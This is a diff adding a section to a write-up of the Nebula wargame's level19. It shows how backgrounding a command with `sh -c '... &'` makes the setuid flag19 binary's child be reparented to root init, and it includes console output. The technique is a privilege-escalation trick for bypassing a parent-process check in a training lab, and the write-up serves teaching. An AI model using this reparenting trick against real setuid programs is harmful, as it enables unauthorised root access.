@@ -51,3 +51,10 @@ Ideas for exploitation:
   * `cron` executes commands using a user owned shell, thus the parent of our process will not be root `cron`.
 * kill the parent process, cause child to move to a new parent - root `init` process
   * race condition, parent should be killed before child executes critical code parts
+
+### Init Parent Process
+I found that executing `sh -c 'COMMAND &'` will cause the wanted effect.
+```console
+level19@nebula:/home/flag19$ sh -c './flag19 -c "echo hello world"&'
+level19@nebula:/home/flag19$ hello world
+```
